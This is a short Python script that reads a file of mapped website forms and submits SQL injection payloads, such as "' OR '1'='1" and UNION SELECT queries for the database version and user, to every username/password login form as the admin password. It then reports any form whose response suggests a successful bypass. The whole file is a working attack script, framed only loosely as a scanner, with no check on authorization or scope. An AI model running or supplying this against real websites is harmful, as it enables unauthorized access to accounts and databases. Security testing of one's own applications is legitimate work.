import requests
import json

# Load mapped website data
with open("mapped_data.json", "r") as f:
    mapped_data = json.load(f)

# SQL Injection Payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 'a'='a",
    "' UNION SELECT NULL, version() --",
    "' UNION SELECT NULL, user() --"
]

print("\n🔍 Scanning for SQL Injection vulnerabilities...\n")

# Iterate over all discovered forms
for entry in mapped_data:
    if entry["method"] == "POST" and "username" in entry["inputs"] and "password" in entry["inputs"]:
        target_url = entry["url"]  # Use the form's action URL
        print(f"📌 Testing: {target_url}")

        # Prepare data dictionary
        post_data = {"username": "admin", "password": ""}

        # Inject SQL payloads
        for payload in payloads:
            post_data["password"] = payload
            print(f"🛠️  Testing payload: {payload}")

            try:
                response = requests.post(target_url, data=post_data)

                # Modify this condition based on how your app responds to successful logins
                if "Welcome" in response.text or "Dashboard" in response.text:
                    print(f"⚠️  Possible SQL Injection Detected at {target_url}!")
                    print(f"🚀 Vulnerable payload: {payload}")
                    break  # Stop testing if we find a vulnerability
            except Exception as e:
                print(f"❌ Error: {e}")

print("\n✅ Scan complete!")
